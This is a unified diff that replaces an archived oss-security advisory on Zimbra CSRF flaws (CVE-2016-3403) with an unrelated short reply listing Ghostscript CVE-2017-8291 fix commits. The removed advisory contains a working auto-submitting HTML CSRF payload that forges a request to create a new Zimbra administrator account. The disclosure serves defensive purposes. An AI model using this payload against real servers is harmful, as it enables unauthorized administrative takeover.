@@ -1,88 +1,21 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/11/11
-Message-ID: <cf184207-ba87-9bd0-d1f9-d654f4cdc18e@sysdream.com>
-Date: Wed, 11 Jan 2017 15:10:02 +0100
-From: Sysdream Labs <labs@...dream.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/28/4
+Message-ID: <20170428030832.GB53619@wopr>
+Date: Thu, 27 Apr 2017 20:08:32 -0700
+From: Kurt H Maier <khm@...ops.net>
 To: oss-security@...ts.openwall.com
-Cc: fulldisclosure@...lists.org
-Subject: [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface - all versions
+Subject: Re: CVE-2017-8291 ghostscript remote code execution
 Content-Type: text/plain; charset=utf-8
 
-# CVE-2016-3403: Multiple CSRF in Zimbra Administration interface
+On Fri, Apr 28, 2017 at 01:50:04AM -0000, security@...assian.com wrote:
+>  CVE-2017-8291 was reported initially to Ghostscript by the Atlassian Security Team. We worked with the developers of Ghostscript to address this vulnerability. This vulnerability impacts versions 9.21 and earlier, and is called from many other libraries, such as Pillow and ImageMagick. Fortunately, fixes have now been pushed to master and can be reviewed here: 
+>
+> https://u4790715.ct.sendgrid.net/wf/click?upn=UqF7hxEfY-2BoQE5y7ee5wrpEERVsJr450MPBUJBBKike04wjKjU6jNBRqCvnzFkirKb6U3wFxO6cZ2MrfZFe9KXxeenPQ9IFz8TJhw6LOtOaFuB-2BSAw9BeCw0BhtT081tIKPb6Ah9qpSmP-2FzO2sx-2BjA-3D-3D_XV8vHdrbCxPyFLm6RhvyOinpL-2BlJJ4T-2BnPsLAd4H4ga1C-2B6KK34tjEg4ad7hndokvEujZN9oFs-2BPmwZc69UJbIeCjEPp1RqnDE5ZMVkV8u-2FQck2RKXjMbDOcixr2-2BNtOmj3Wzq5XwkhDFXhU2AKyL9layYKe-2BQtxt0vvnrLW-2BhggU2jp-2FuYmlu1mgnKq3GLT-2BQs66xRLMVK0ptzU4dayw9UBPVRQ2Fkfj-2FJw1BXrk-2BY-3D 
 
-## Description
+https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=04b37bbce174eed24edec7ad5b920eb93db4d47d
 
-Multiple CSRF vulnerabilities have been found in the administration
-interface of Zimbra, giving possibilities like adding, modifying and
-removing admin accounts.
+> and https://u4790715.ct.sendgrid.net/wf/click?upn=UqF7hxEfY-2BoQE5y7ee5wrpEERVsJr450MPBUJBBKike04wjKjU6jNBRqCvnzFkirJzYNkGRnjRAeENnIy4IlGMktl4IMwqOL-2F6c9eA2tuyk4XtZY7kQE2gU21K2S6Iame7IH19-2BL1vfBFf0SU6yEiA-3D-3D_XV8vHdrbCxPyFLm6RhvyOinpL-2BlJJ4T-2BnPsLAd4H4ga1C-2B6KK34tjEg4ad7hndokvEujZN9oFs-2BPmwZc69UJbPyFjltEjXNsT3qz-2Fb9AtZOlxcf7srfg3ApNJwAPl06rQsoKGLAu393JsVQP6IMnwpmfkPtqhUc0Kd-2Fr-2BdA39SFaSuqgV1MSaFq7Bx7Osg3G1ng9ujPr9Xt71FOQOsCM9Ada5YhYxQbHq72hBUfE7-2Bo-3D
 
-## Vulnerability
+https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=4f83478c88c2e05d6e8d79ca4557eb039354d2f3
 
-Every forms in the Administration part of Zimbra are vulnerable to CSRF
-because of the lack of a CSRF token identifying a valid session. As a
-consequence, requests can be forged and played arbitrarily.
-
-**Access Vector**:   remote
-**Security Risk**:   low
-**Vulnerability**:   CWE-352
-**CVSS Base score**: 5.8
-
-## Proof of Concept
-
-```html
-<html>
-<body>
-<form enctype="text/plain" id="trololo"
-action="https://192.168.0.171:7071/service/admin/soap/CreateAccountRequest"
-method="POST">
-    <input name='<soap:Envelope
-xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
-xmlns="urn:zimbra"><userAgent xmlns="" name="DTC"/><session xmlns=""
-id="1337"/><format xmlns=""
-type="js"/></context></soap:Header><soap:Body><CreateAccountRequest
-xmlns="urn:zimbraAdmin"><name xmlns="">itworks@...ntu.fr</name><password
-xmlns="">test1234</password><a xmlns=""
-n="zimbraAccountStatus">active</a><a xmlns=""
-n="displayName">ItWorks</a><a xmlns="" n'
-
-        value='"sn">itworks</a><a xmlns=""
-n="zimbraIsAdminAccount">TRUE</a></CreateAccountRequest></soap:Body></soap:Envelope>'/>
-</form>
-<script>
-document.forms[0].submit();
-</script>
-</body>
-</html>
-```
-
-## Solution
-
-  * Upgrade to version 8.7
-
-## Affected versions
-
- * All versions previous to 8.7
-
-## Fixes
-
- * https://bugzilla.zimbra.com/show_bug.cgi?id=100885
- * https://bugzilla.zimbra.com/show_bug.cgi?id=100899
-
-## Timeline (dd/mm/yyyy)
-
- * 24/02/2016: Issue reported to Zimbra
- * 24/02/2016: Issue aknwoledged
- * 20/06/2016: complete fixes released with version 8.7
-
-## Credits
-
- * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
--dot- fr)
- * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)
- 
- 
-
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+khm
